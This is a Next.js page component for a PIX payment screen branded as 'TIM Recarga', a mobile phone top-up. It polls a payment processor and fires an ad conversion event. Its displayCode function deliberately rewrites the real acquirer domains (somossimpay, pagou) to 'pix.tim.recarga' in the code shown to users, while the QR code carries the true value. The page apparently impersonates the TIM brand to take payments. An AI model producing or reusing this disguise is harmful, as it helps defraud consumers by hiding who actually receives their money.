"use client";

import { useEffect, useState, useMemo, useRef } from "react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import Image from "next/image";
import { Clock } from "lucide-react";
import CountdownTimer from "@/components/CountdownTimer";
import PixQRCode from "@/components/PixQRCode";
import CopyPixButton from "@/components/CopyPixButton";
import { useRechargeStore } from "@/lib/store";
import { getPixStatus } from "@/lib/pix-api";
import { formatBrl } from "@/lib/phone-mask";

export default function PagamentoPage() {
  const router = useRouter();
  const { phone, phoneFormatted, valor, pixData, setPixData } = useRechargeStore();

  // Status vem do servidor (Pagou). A única coisa que move o usuário pra
  // /pagamento/sucesso é `status === "paid"`. Timer expirando NÃO redireciona.
  const [status, setStatus] = useState<"pending" | "paid" | "expired">("pending");
  const [timerZeroed, setTimerZeroed] = useState(false);
  const conversionFiredRef = useRef<string | null>(null);

  useEffect(() => {
    if (!phone || !pixData) {
      router.replace("/recarga");
    }
  }, [phone, pixData, router]);

  useEffect(() => {
    if (!pixData?.id) return;
    if (conversionFiredRef.current === pixData.id) return;
    const gtag = (window as unknown as { gtag?: (...args: unknown[]) => void }).gtag;
    if (typeof gtag !== "function") return;
    gtag("event", "conversion", {
      send_to: "AW-17766226464/TYKQCIeh48obEKC0zJdC",
      value: 1.0,
      currency: "BRL",
      transaction_id: pixData.id,
    });
    conversionFiredRef.current = pixData.id;
  }, [pixData?.id]);

  useEffect(() => {
    if (!pixData) return;
    let cancelled = false;
    let intervalId: number | undefined;

    const poll = async () => {
      try {
        const current = await getPixStatus(pixData.id);
        if (cancelled) return;
        setStatus(current);
        if (current === "paid") {
          if (intervalId) window.clearInterval(intervalId);
          router.push("/pagamento/sucesso");
        }
        // Importante: se for "expired" do server, NÃO redirecionamos.
        // Apenas exibimos a UI de expirado e mantemos o polling leve
        // (o servidor pode ainda confirmar um pagamento atrasado).
      } catch {
        /* silencioso — tenta de novo no próximo tick */
      }
    };

    poll();
    intervalId = window.setInterval(poll, 3000);
    return () => {
      cancelled = true;
      if (intervalId) window.clearInterval(intervalId);
    };
  }, [pixData, router]);

  // Mascara o domínio do adquirente no copia-cola mostrado
  const displayCode = useMemo(() => {
    if (!pixData?.copyPaste) return "";
    return pixData.copyPaste
      .replace(/qrcode\.somossimpay\.com\.br/gi, "pix.tim.recarga")
      .replace(/somossimpay\.com\.br/gi, "tim.recarga")
      .replace(/qrcode\.pagou\.com\.br/gi, "pix.tim.recarga")
      .replace(/pagou\.com\.br/gi, "tim.recarga")
      .replace(/api\.conta\.pagou\.ai/gi, "pix.tim.recarga");
  }, [pixData?.copyPaste]);

  if (!pixData) {
    return (
      <div className="flex min-h-[60vh] items-center justify-center bg-tim-blue-primary">
        <div className="text-center text-white/80">
          Redirecionando para a recarga...
        </div>
      </div>
    );
  }

  const serverExpired = status === "expired";

  return (
    <div className="min-h-[calc(100vh-60px)] bg-tim-blue-primary md:min-h-[calc(100vh-102px)]">
      <div className="mx-auto max-w-[480px] px-4 pb-12 pt-4 text-center sm:px-6 md:pt-8">
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.35, ease: "easeOut" }}
        >
          {/* Logo inline compacto */}
          <div className="flex items-center justify-center gap-2">
            <Image
              src="/imgi_1_size_960_16_9_tim-logotipo8-removebg-preview.png"
              alt="TIM"
              width={24}
              height={24}
              priority
              className="h-6 w-6"
            />
            <span className="text-[18px] font-black text-white">TIM</span>
            <span className="text-[18px] font-semibold text-white">Recarga</span>
          </div>

          <h2 className="mt-5 text-[22px] md:text-[24px] font-bold text-white">
            Pagamento via PIX
          </h2>
          <p className="mt-1.5 text-[13px] md:text-[14px] text-white/80">
            Recarga de <strong>{formatBrl(valor)}</strong> para{" "}
            <strong>{phoneFormatted}</strong>
          </p>

          <div className="mt-5">
            {timerZeroed ? (
              // Timer zerado: mostra 00:00 em amarelo esmaecido
              <div className="mx-auto flex w-full max-w-[360px] flex-col items-center">
                <div className="flex items-center gap-2 text-white">
                  <Clock size={20} strokeWidth={2.2} />
                  <span className="text-[28px] font-bold tabular-nums leading-none">
                    00:00
                  </span>
                </div>
                <div className="mt-3 h-1.5 w-full overflow-hidden rounded-full bg-white/15">
                  <div className="h-full w-0 rounded-full bg-tim-yellow" />
                </div>
                <p className="mt-2 text-[12px] text-white/70">
                  Tempo de pagamento esgotado
                </p>
              </div>
            ) : (
              <CountdownTimer
                expiresAt={pixData.expiresAt}
                totalSeconds={600}
                // IMPORTANTE: onExpire só marca visualmente o timer zerado.
                // NÃO redireciona e NÃO muda status — só o servidor (Pagou)
                // pode declarar "paid" e mover o usuário adiante.
                onExpire={() => setTimerZeroed(true)}
              />
            )}
          </div>

          <div className="mt-6">
            <PixQRCode value={pixData.copyPaste} size={200} />
          </div>

          <div className="mx-auto mt-5 max-w-[400px]">
            <CopyPixButton code={pixData.copyPaste} />
          </div>

          <div className="mt-3 rounded-xl border border-[#00C853] bg-[#1A3DD9]/60 px-3.5 py-3 backdrop-blur-sm">
            <p className="break-all text-center font-mono text-[10.5px] leading-[1.55] text-white/95">
              {displayCode}
            </p>
          </div>

          <p className="mt-4 text-[12px] leading-5 text-white/75 md:text-[13px]">
            Escaneie o QR Code acima ou toque no botão para copiar o código PIX e cole no app do seu banco.
          </p>

          {/* Timer zerado SEM pagamento confirmado: oferece gerar novo PIX
              mas continua esperando (se a pessoa ainda pagar em atraso
              e a Pagou confirmar, o polling move pra /sucesso) */}
          {timerZeroed && status !== "paid" && (
            <div className="mt-5 rounded-xl border border-tim-yellow/40 bg-tim-yellow/10 p-4 text-sm text-white">
              <p className="font-bold">Código PIX com tempo esgotado</p>
              <p className="mt-1 text-[12px] text-white/80">
                Se você já pagou, aguarde a confirmação. Caso contrário, gere um novo PIX.
              </p>
              <button
                type="button"
                onClick={() => {
                  setPixData(null);
                  router.push("/recarga/valores");
                }}
                className="mt-3 inline-flex items-center rounded-lg bg-tim-yellow px-4 py-2 text-[13px] font-bold text-tim-blue-primary transition-all hover:bg-tim-yellow-dark"
              >
                Gerar novo PIX
              </button>
            </div>
          )}

          {/* Servidor confirmou que o PIX foi recusado/cancelado */}
          {serverExpired && (
            <div className="mt-3 rounded-xl bg-red-500/20 p-3 text-[12px] text-white">
              Esta cobrança foi cancelada. Gere um novo PIX para tentar novamente.
            </div>
          )}

          <div className="mt-6 flex items-center justify-center gap-2 text-[12px] text-white/60">
            <div className="h-2 w-2 animate-pulse rounded-full bg-tim-yellow" />
            <span>Aguardando pagamento</span>
          </div>
        </motion.div>
      </div>
    </div>
  );
}
